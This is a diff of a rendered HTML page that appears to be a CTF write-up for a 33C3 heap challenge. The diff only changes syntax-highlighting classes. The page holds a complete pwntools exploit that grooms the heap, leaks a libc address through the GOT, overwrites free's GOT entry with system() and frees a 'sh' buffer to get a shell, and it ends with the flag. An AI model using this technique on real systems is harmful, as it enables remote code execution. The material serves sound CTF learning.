@@ -391,36 +391,36 @@ userD-&gt;desc |                       |
 <span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./libc-2.19.so"</span>
 
 <span class="c1"># setting 
-</span><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
-<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="p">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
 <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
-</span><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
+</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">add_user</span><span class="p">(</span><span class="n">desc_len</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">text_len</span><span class="p">,</span> <span class="n">text</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"description: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">desc_len</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name: "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"length: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">text_len</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"text: "</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"description: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">desc_len</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name: "</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"length: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">text_len</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"text: "</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">del_user</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">show_user</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
 
 <span class="k">def</span> <span class="nf">update_user</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">text_len</span><span class="p">,</span> <span class="n">text</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"length: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">text_len</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"text: "</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Action: "</span><span class="p">,</span> <span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"index: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"length: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">text_len</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"text: "</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
@@ -432,25 +432,25 @@ userD-&gt;desc |                       |
     <span class="n">add_user</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="s">"C"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="s">"sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span> <span class="c1"># user[2], desc = "sh\x00" (for later's GOT hijacking)
 </span>    <span class="n">del_user</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
     <span class="n">add_user</span><span class="p">(</span><span class="mi">90</span><span class="p">,</span> <span class="s">"D"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="s">"d"</span><span class="o">*</span><span class="mi">12</span><span class="p">)</span>
-    <span class="n">add_user</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="s">"E"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]))</span> 
+    <span class="n">add_user</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span> <span class="s">"E"</span><span class="o">*</span><span class="mi">123</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]))</span> 
     <span class="c1"># now user[4]'s desc is user[0]'s desc (in previous)
 </span>    <span class="c1"># user[4]-&gt;desc + 0x2c8 = user[4], which means we can overflow user[4]-&gt;desc &amp; overwrite user[1]-&gt;desc to libc_start_main@got.plt
 </span>
     <span class="c1"># leak address
 </span>    <span class="n">show_user</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"description: "</span><span class="p">)</span>
-    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
-    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"description: "</span><span class="p">)</span>
+    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_start_main'</span><span class="p">]</span>
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
     
     <span class="c1"># change user[1]-&gt;desc into free@got.plt
 </span>    <span class="c1"># hijack free's got, then free user[2] to get shell
-</span>    <span class="n">update_user</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">]))</span>
+</span>    <span class="n">update_user</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'free'</span><span class="p">]))</span>
     <span class="n">update_user</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
     <span class="n">del_user</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
 
-    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>flag: <code class="language-plaintext highlighter-rouge">33C3_h34p_3xp3rts_c4n_gr00m_4nd_f3ng_shu1</code></p>
